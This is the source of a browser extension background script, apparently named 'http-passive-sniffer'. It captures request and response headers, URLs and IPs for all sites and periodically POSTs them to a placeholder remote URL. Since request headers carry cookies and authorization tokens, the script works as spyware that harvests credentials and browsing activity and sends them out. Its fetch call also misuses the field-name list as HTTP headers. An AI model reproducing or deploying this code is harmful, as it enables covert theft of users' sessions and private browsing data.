let config = {
  has_change: false,
  post_url: 'some_post_url',
  method: 'POST',
  post_interval: 10000,
  headers: [
    'initiator','method','requestHeaders',
    'responseHeaders', 'timeStamp','type',
    'url', 'statusCode',
    'statusLine', 'ip', 'statusText'
  ]
}

let cache = {
  request: []
}

const utils = {
  debounce(func, wait, immediate) {
    let timeout;
    return function() {
      let context = this,
      args = arguments,
      later = function() {
        timeout = null;
        if (!immediate) {
          func.apply(context, args);
        }
      }
      let callNow = immediate && !timeout;
      clearTimeout(timeout);
      timeout = setTimeout(later, wait);
      if(callNow){
        func.apply(context, args);
      }
    }
  }
}

browser.runtime.onInstalled.addListener(function() {

  browser.storage.local.set({request:[]}).then(function(res) {
   console.log('http-passive-sniffer installed')
  })

});

window.addEventListener("store-data", utils.debounce(function(evt) {

  browser.storage.local.get(['request']).then(function(res){
    res['request'] = res['request'].concat(cache['request']);
    browser.storage.local.set(res);
    cache['request'] = [];
  })

  config.has_change = true;

},3000));

// request
browser.webRequest.onSendHeaders.addListener(function (headers){

  let obj = {},
  item = config.headers;

  for (let i = 0; i < item.length; i++) {
    if(headers[item[i]]){
      obj[item[i]] = headers[item[i]];
    }
  }

  cache.request.push(obj);

  window.dispatchEvent(new CustomEvent("store-data"));

}, {urls: ["<all_urls>"]}, ["requestHeaders"]);

// response
browser.webRequest.onCompleted.addListener(function (headers){
  console.log(headers)
  let obj = {},
  item = config.headers;

  for (let i = 0; i < item.length; i++) {
    if(headers[item[i]]){
      obj[item[i]] = headers[item[i]];
    }
  }

  cache.request.push(obj);

  window.dispatchEvent(new CustomEvent("store-data"));

}, {urls: ["<all_urls>"]}, ["responseHeaders"]);

setInterval(function(){

  if(config.has_change){
    browser.storage.local.get(['request']).then(function(res){
  
      fetch(config.post_url, {
        method: config.method,
        headers: config.headers,
        body: JSON.stringify(res)
      }).then(function(res){
        if (res.status >= 200 && res.status < 300) {
          return res.json();
        } else {
          return Promise.reject(new Error(res.statusText))
        }
      }).then(function(data){

        browser.storage.local.get(['request']).then(function(res){
          res['request'] = [];
          browser.storage.local.set(res);
        })

        config.has_change = false;

      }).catch(function(err){

      })

    })
  }

},config.post_interval)
